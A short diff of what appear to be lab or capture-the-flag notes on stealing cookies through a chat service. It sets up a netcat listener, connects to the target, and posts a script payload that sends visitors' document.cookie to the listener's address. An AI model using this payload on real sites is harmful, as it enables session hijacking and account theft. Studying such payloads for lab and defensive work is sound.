@@ -90,7 +90,7 @@ Open console in Inspector and run js manually, e.g. changetext()
 Setup nc listener
 nc -lk 10.50.187.52 42071  # Where you want to intercept cookie
 nc -Cv 192.168.28.111 8080
-
+GET / HTTP/1.0
 Post to chat...
 <script>document.location="http://10.50.187.52:42070/?username=" + document.cookie;</script>
 
